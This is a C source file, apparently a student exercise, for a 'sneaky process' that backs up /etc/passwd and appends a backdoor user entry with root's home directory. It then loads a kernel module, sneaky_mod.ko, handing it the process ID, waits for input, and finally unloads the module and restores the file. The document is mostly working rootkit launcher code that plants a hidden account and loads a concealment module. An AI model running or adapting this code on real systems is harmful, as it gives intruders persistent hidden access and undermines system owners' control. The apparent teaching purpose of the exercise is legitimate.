#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/wait.h>

int cp(const char *to, const char *from)
{
  int fd_to, fd_from;
  char buf[4096];
  ssize_t nread;
  int saved_errno;
  fd_from = open(from, O_RDONLY);
  if (fd_from < 0)
    return -1;
  fd_to = open(to, O_WRONLY | O_CREAT | O_TRUNC, 0666);
  if (fd_to < 0)
    goto out_error;
  while (nread = read(fd_from, buf, sizeof buf), nread > 0)
    {
      char *out_ptr = buf;
      ssize_t nwritten;
      do {
	nwritten = write(fd_to, out_ptr, nread);
      	if (nwritten >= 0)
	  {
	    nread -= nwritten;
	    out_ptr += nwritten;
	  }
	else if (errno != EINTR)
	  {
	    goto out_error;
	  }
      } while (nread > 0);
    }
  if (nread == 0)
    {
      if (close(fd_to) < 0)
	{
	  fd_to = -1;
	  goto out_error;
	}
      close(fd_from);
      /* Success! */
      return 0;
    }
 out_error:
  saved_errno = errno;
  close(fd_from);
  if (fd_to >= 0)
    close(fd_to);
  errno = saved_errno;
  return -1;
}


int main(int argc, char **argv) {
  printf("sneaky_process pid=%d\n", getpid());

  //1.copy /etc/passwd to /tmp/passwd
  int return_value = cp("/tmp/passwd", "/etc/passwd");
  //int return_value = cp("b.txt", "a.txt");        
  if (return_value == -1) {
    perror("copy file fail");
    return EXIT_FAILURE;
  }
  printf("finish: 1.copy /etc/passwd to /tmp/passwd\n");
  
  //1.open /etc/passwd to append a line  
  FILE *pFile;
  char buffer[256] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  pFile = fopen("/etc/passwd", "a");
  if(pFile == NULL) {
    perror("error opening file");
    return EXIT_FAILURE;
  }
  fprintf(pFile, "%s", buffer);
  fclose(pFile);
  printf("finish: 1.open /etc/passwd to append a line\n");
  // printf("SLEEP\n");
  //  sleep(30);
  // printf("AWAKE");

  //2.load the sneaky module (sneaky_mod.ko), pass its process ID
  pid_t parent = getpid();
  pid_t pid = fork();
  if (pid == -1) // error, failed to fork() 
    {
      perror("fork() to run insmod fail");
    }
  else if (pid > 0) //parent
    {
      int status;
      waitpid(pid, &status, 0);   //???
    }
  else if (pid == 0)
    {
      //construct module argument
      char mod_arg[100];
      snprintf(mod_arg, 100, "sn_pid=%d", (int)parent);
      char* args[] = {"/sbin/insmod", "sneaky_mod.ko", mod_arg, NULL};
      //on the other side, in sneaky_mod.c, there should be a variable sn_pid to take the argument     
      execv("/sbin/insmod", args); //exec() return only when error
      perror("execve() insmod in child process fail");
      _exit(EXIT_FAILURE);   
    }
  printf("finish: 2. load sneaky module\n");
 
  //3. enter a loop, interact with the system where the malicious behavior is tested
  int cmd;
  while ((cmd = getchar()) != 'q') {
    //keep reading a char at a time
  }
  printf("finish: 3. while loop\n");
  
  //4.unload the sneaky module
  pid = fork();  
  if (pid == -1) // error, failed to fork() 
    {
      perror("fork() to run [rmmod] fail");
    }
  else if (pid > 0) //parent
    {
      int status;
      waitpid(pid, &status, 0);
    }
  else if (pid == 0)
    {
      char *const argv[] = {"/sbin/rmmod", "sneaky_mod.ko", NULL};
      execv("/sbin/rmmod", argv); 
      perror("execve() [rmsmod] in child process fail");
      _exit(EXIT_FAILURE);   // exec never returns
    }
  printf("finish: 4. unload sneaky module\n");

  //5.restore the /etc/passwd file by copying /tmp/passwd to /etc/passwd.
  pid = fork();
  if (pid == -1) // error, failed to fork() 
    {
      perror("fork() to run [cp] fail");
    }
  else if (pid > 0) //parent
    {
      int status;
      waitpid(pid, &status, 0);
    }
  else if (pid == 0)
    {
      char *const argv[] = {"/bin/cp", "/tmp/passwd", "/etc/passwd", NULL};
      execv("/bin/cp", argv); 
      perror("execve() [cp] in child process fail");
      _exit(EXIT_FAILURE);   // exec never returns
    }
  printf("finish: 5.restore the /etc/passwd file by copying /tmp/passwd to /etc/passwd\n");

  //have not removed temp ?!
  
  return EXIT_SUCCESS;
}
